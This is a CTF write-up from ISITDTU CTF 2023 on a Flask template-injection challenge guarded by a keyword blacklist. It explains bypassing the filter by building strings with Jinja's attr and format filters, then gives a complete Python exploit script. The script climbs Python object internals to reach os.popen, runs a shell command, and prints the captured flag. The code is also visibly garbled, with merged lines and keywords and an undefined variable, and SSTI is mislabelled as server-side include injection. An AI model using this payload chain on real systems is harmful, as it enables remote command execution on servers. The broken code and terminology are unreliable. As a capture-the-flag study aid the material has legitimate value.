# thru_the_filter_test_flag

Source: ISITDTU CTF 2023
Technique: SSTI
Fields: Web
Notes: nhặt đc tool Bypass the WAF without knowing WAF(SSTI)

- SOURCE
    
    ```python
    from flask import Flask, request, render_template_string,redirect
    
    app = Flask(__name__)
    def check_payload(payload):
        blacklist = ['import', 'request', 'init', '_', 'b', 'lipsum', 'os', 'globals', 'popen', 'mro', 'cycler', 'joiner', 'u','x','g','args', 'get_flashed_messages', 'base', '[',']','builtins', 'namespace', 'self', 'url_for', 'getitem','.','eval','update','config','read','dict']
        for blin blacklist:
            if blin payload:
                returnTruereturnFalse@app.route("/")
    def home():
        if request.args.get('c'):
            if(check_payload(ssti)):
                return "HOLD UP !!!"
            else:
                return render_template_string(request.args.get('c'))
        else:
            return redirect("""/?c={{ 7*7 }}""")
    
    if __name__ == "__main__":
        app.run()
    ```
    
- The code shows that basic Server Side Include Injection (SSTI) vulnerability is **`{{ 7 * 7 }}`**
- But function **`check_payload`** already filtered so many and after looking the blacklist, i thought we need some special trick bypassing this filter.

Trick Bypass: **attr + format**

- Because they filter most of word that can ssti so we need to use attr and format to generate the string to bypass this.
- Example: **`attr("%c%c%c%c%c%c%c%c%c%c%c%c"|format(99,97,116,32,102,108,97,103,46,116,120,116))`** is generate to **`cat flag.txt`**
- The final exploit script:
    
    ```python
    import requests
    
    def gen(p):
        num_c = len(p)
    
        chrs = ""
    
        for iin p:
            chrs += str(ord(i)) + ","
        chrs = chrs[:-1]
    
        return f'attr(\"{"%c"*num_c}\"|format({chrs}))'
    
    # Define the URL and query parametersurl = 'http://localhost:1338'
    payload = f'{{()|{gen("__class__")}|{gen("__base__")}|{gen("__subclasses__")}() | {gen("__getitem__")}(367) | {gen("__init__")} | {gen("__globals__") } | {gen("__getitem__")}("o""s")|attr("po""pen")("%c%c%c%c%c%c%c%c%c%c%c%c"|format(99,97,116,32,102,108,97,103,46,116,120,116))|attr("re""ad")()}}'
    params = {
        'c': payload
    }
    
    # Define the headersheaders = {
        'Host': 'localhost:1338',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'close'
    }
    
    # Send the GET requestresponse = requests.get(url, params=params, headers=headers)
    
    # Check the responseif response.status_code == 200:
        print(response.text)
    else:
        print(f"Request failed with status code: {response.status_code}")
    
    #ISITDTU{tough_times_create_tough_guys!@@%#0@}
    ```